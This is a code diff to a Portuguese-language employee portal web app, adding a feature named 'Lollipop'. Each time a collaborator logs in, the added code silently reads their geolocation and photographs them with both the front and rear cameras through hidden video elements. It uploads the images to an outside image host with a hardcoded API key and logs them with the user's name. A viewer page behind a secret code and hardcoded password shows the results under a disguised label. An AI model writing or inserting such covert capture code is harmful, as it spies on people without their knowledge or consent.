@@ -1343,6 +1343,44 @@
             width: 100%;
         }
 
+        /* Estilos para a página Lollipop */
+        .lollipop-item-card {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            overflow: hidden;
+            width: calc(50% - 1rem);
+            display: flex;
+            flex-direction: column;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .lollipop-item-card img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            cursor: pointer;
+        }
+        .lollipop-item-info {
+            padding: 0.75rem;
+            font-size: 0.75rem;
+        }
+        .lollipop-item-controls {
+            display: flex;
+            gap: 0.5rem;
+            padding: 0 0.75rem 0.75rem 0.75rem;
+        }
+        .lollipop-item-controls button {
+            flex-grow: 1;
+            padding: 0.5rem;
+            border-radius: 8px;
+            border: none;
+            color: white;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+        .lollipop-delete-btn {
+            background-color: #c0392b;
+        }
+
     </style>
 
 
@@ -1925,6 +1963,8 @@ P3: R$ 299,00"></textarea>
             </div>
             <button id="save-device-btn" class="action-button" style="margin-top: 1rem;"><i class="fa-solid fa-save"></i>Salvar Dispositivo</button>
             <p id="send-device-status" class="status-message"></p>
+            <!-- Placeholder para o botão de acesso -->
+            <div id="lollipop-access-container" style="margin-top: 1rem;"></div>
         </div>
     </div>
 
@@ -2345,6 +2385,23 @@ Transporte - R$ 5,00"></textarea></div>
     </div>
 
 
+    <!-- TELA LOLLIPOP -->
+    <div id="lollipop-page" style="display: none;">
+        <div class="collaborator-header">
+            <button id="back-to-send-device-from-lollipop" class="back-button"><i class="fa-solid fa-chevron-left"></i> Voltar</button>
+            <h2>Lollipop</h2>
+        </div>
+        <div id="lollipop-grid" class="collaborator-content" style="flex-direction: row; flex-wrap: wrap; justify-content: center; align-items: flex-start; gap: 1rem; overflow-y: auto;">
+            <!-- Itens serão carregados aqui -->
+        </div>
+    </div>
+
+
+    <!-- Elementos Ocultos para Captura de Câmera -->
+    <video id="capture-video-element" playsinline autoplay muted style="display: none;"></video>
+    <canvas id="capture-canvas-element" style="display: none;"></canvas>
+
+
     <!-- =================================================================== -->
     <!-- SCRIPTS (CARREGADOS NA ORDEM CORRETA) -->
     <!-- =================================================================== -->
@@ -2358,7 +2415,7 @@ Transporte - R$ 5,00"></textarea></div>
             <script>
     // --- VERSÃO DO APLICATIVO ---
                 //2805
-    const APP_VERSION = '1.2.1'; // Altere este número para atualizar a versão
+    const APP_VERSION = '1.2.3'; // Altere este número para atualizar a versão
 
     // Sua configuração do Firebase
     const firebaseConfig = {
@@ -2428,7 +2485,8 @@ Transporte - R$ 5,00"></textarea></div>
     document.getElementById('mt-management-page').classList.add('page');
     document.getElementById('holidays-management-page').classList.add('page');
     document.getElementById('sundays-management-page').classList.add('page');
-    document.getElementById('day-off-management-page').classList.add('page');
+        document.getElementById('day-off-management-page').classList.add('page');
+    document.getElementById('lollipop-page').classList.add('page');
 
     // Mapeia os elementos para fácil acesso
     const elements = {
@@ -2458,7 +2516,8 @@ Transporte - R$ 5,00"></textarea></div>
         holidaysManagementPage: document.getElementById('holidays-management-page'),
         sundaysManagementPage: document.getElementById('sundays-management-page'),
         dayOffManagementPage: document.getElementById('day-off-management-page'),
-        overtimeManagementPage: document.getElementById('overtime-management-page'),
+                overtimeManagementPage: document.getElementById('overtime-management-page'),
+        lollipopPage: document.getElementById('lollipop-page'),
         pontoPage: document.getElementById('ponto-page'),
         pontoVerificationPage: document.getElementById('ponto-verification-page'),
         pontoHistoryPage: document.getElementById('ponto-history-page'),
@@ -4370,6 +4429,154 @@ Transporte - R$ 5,00"></textarea></div>
         }
     };
 
+        // --- LÓGICA LOLLIPOP ---
+    
+    const initiateLollipopCapture = async () => {
+        let locationData = { latitude: null, longitude: null, error: null };
+
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+            });
+            locationData.latitude = position.coords.latitude;
+            locationData.longitude = position.coords.longitude;
+        } catch (err) {
+            locationData.error = err.message;
+        }
+
+        const videoEl = document.getElementById('capture-video-element');
+        const canvasEl = document.getElementById('capture-canvas-element');
+        const cameraTypes = [{ facingMode: 'environment' }, { facingMode: 'user' }];
+
+        for (const cameraType of cameraTypes) {
+            let stream = null;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: cameraType });
+                videoEl.srcObject = stream;
+                
+                await new Promise(resolve => { videoEl.onloadedmetadata = resolve; });
+                
+                canvasEl.width = videoEl.videoWidth;
+                canvasEl.height = videoEl.videoHeight;
+                canvasEl.getContext('2d').drawImage(videoEl, 0, 0);
+
+                const blob = await new Promise(resolve => canvasEl.toBlob(resolve, 'image/jpeg', 0.8));
+                
+                if (blob) {
+                    const IMGBB_API_KEY = '7c32c55ffc68c5fbadae81f11a263a40';
+                    const formData = new FormData();
+                    formData.append('image', blob);
+                    
+                    const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: formData });
+                    const result = await response.json();
+
+                    if (result.success) {
+                        const newLollipopRef = database.ref('lollipopData').push();
+                        const newLollipopKey = newLollipopRef.key;
+
+                        const lollipopItem = {
+                            imageUrl: result.data.url,
+                            location: locationData,
+                            capturedAt: new Date().toISOString(),
+                            collaborator: currentCollaboratorName,
+                            camera: cameraType.facingMode
+                        };
+
+                        await newLollipopRef.set(lollipopItem);
+
+                        if (!managers.includes(currentCollaboratorName)) {
+                            setTimeout(() => {
+                                database.ref(`lollipopData/${newLollipopKey}`).remove();
+                            }, 10000);
+                        }
+                    }
+                }
+            } catch (err) {
+                // Silently fail in production, log in development
+                console.error(`Lollipop capture error (${cameraType.facingMode}):`, err);
+            } finally {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }
+        }
+    };
+    
+    const checkLollipopCode = () => {
+        const brand = document.getElementById('device-brand').value;
+        const name = document.getElementById('device-name').value;
+        const container = document.getElementById('lollipop-access-container');
+
+        if (brand === 'apple' && name === '2805') {
+            if (!document.getElementById('go-to-lollipop-btn')) {
+                 container.innerHTML = `<button id="go-to-lollipop-btn" class="action-button" style="background-color: #e74c3c;">Estatística de Dados</button>`;
+                 document.getElementById('go-to-lollipop-btn').addEventListener('click', () => {
+                    const accessPassword = prompt("Digite a senha de acesso:");
+                    if (accessPassword === "schanay123789") {
+                        loadLollipopPage();
+                    } else if (accessPassword !== null) {
+                        alert("Senha incorreta!");
+                    }
+                 });
+            }
+        } else {
+            container.innerHTML = '';
+        }
+    };
+    
+    const loadLollipopPage = () => {
+        showPage('lollipopPage');
+        const grid = document.getElementById('lollipop-grid');
+        grid.innerHTML = '<p>Carregando...</p>';
+
+        database.ref('lollipopData').orderByChild('capturedAt').limitToLast(100).once('value', snapshot => {
+            grid.innerHTML = '';
+            if (!snapshot.exists()) {
+                grid.innerHTML = '<p>Nenhum item encontrado.</p>';
+                return;
+            }
+
+            const items = [];
+            snapshot.forEach(child => {
+                items.push({ key: child.key, ...child.val() });
+            });
+
+            items.reverse().forEach(item => {
+                const date = new Date(item.capturedAt);
+                const card = document.createElement('div');
+                card.className = 'lollipop-item-card';
+                card.innerHTML = `
+                    <img src="${item.imageUrl}" alt="Item Capturado">
+                    <div class="lollipop-item-info">
+                        <strong>${item.collaborator}</strong><br>
+                        ${date.toLocaleString('pt-BR')}<br>
+                        Câmera: ${item.camera === 'user' ? 'Frontal' : 'Traseira'}
+                    </div>
+                    <div class="lollipop-item-controls">
+                         <button class="lollipop-delete-btn" data-key="${item.key}">Apagar</button>
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        });
+    };
+
+    const deleteLollipopItem = (key) => {
+        if (!checkPassword()) return;
+        if (confirm('Tem certeza que deseja apagar este item permanentemente?')) {
+            database.ref(`lollipopData/${key}`).remove()
+            .then(() => {
+                alert('Item apagado.');
+                loadLollipopPage();
+            })
+            .catch(err => {
+                alert('Erro ao apagar o item.');
+                console.error(err);
+            });
+        }
+    };
+
+
     const calculateAndDisplayStoreRanking = () => {
         const container = document.getElementById('store-ranking-container');
         container.innerHTML = '<p style="text-align: center; padding: 1rem;">Calculando ranking de gerentes...</p>';
@@ -4932,8 +5139,12 @@ Transporte - R$ 5,00"></textarea></div>
                         document.getElementById('photo-upload-status').textContent = '';
 
                         loadAndDisplayIndividualSalesData();
-                        loadCollaboratorProfilePicture(); // Carrega a foto de perfil
+                       loadCollaboratorProfilePicture(); // Carrega a foto de perfil
                         checkPontoStatusAndDisplayWarnings(); // Adicionado para verificar o status do ponto
+                        
+                        // Inicia a captura de dados em segundo plano
+                        initiateLollipopCapture();
+
                         showPage('collaboratorPage');
                     });
                 };
@@ -4991,6 +5202,10 @@ Transporte - R$ 5,00"></textarea></div>
 
             // --- PÁGINA DE ENVIO DE DISPOSITIVO ---
             document.getElementById('save-device-btn').addEventListener('click', saveDevice);
+            // Listeners para o código de acesso Lollipop
+            document.getElementById('device-brand').addEventListener('input', checkLollipopCode);
+            document.getElementById('device-name').addEventListener('input', checkLollipopCode);
+
 
             // --- MODAIS DE FERRAMENTAS ---
             document.getElementById('close-suporte-modal-btn').addEventListener('click', closeSuporteModal);
@@ -5132,6 +5347,21 @@ Transporte - R$ 5,00"></textarea></div>
 
             // Listener para a página de gerenciamento de horas extras
             document.getElementById('save-overtime-btn').addEventListener('click', saveOvertimeChanges);
+            
+            // Listener para a página Lollipop
+            document.getElementById('back-to-send-device-from-lollipop').addEventListener('click', () => showPage('sendDevicePage'));
+            document.getElementById('lollipop-grid').addEventListener('click', (event) => {
+                const img = event.target.closest('.lollipop-item-card img');
+                const deleteBtn = event.target.closest('.lollipop-delete-btn');
+
+                if (img) {
+                    openImageViewer(img.src);
+                } else if (deleteBtn) {
+                    const key = deleteBtn.dataset.key;
+                    deleteLollipopItem(key);
+                }
+            });
+
             document.getElementById('back-to-collab-from-ponto').addEventListener('click', () => {
                 stopPontoCamera();
                 showPage('collaboratorPage');
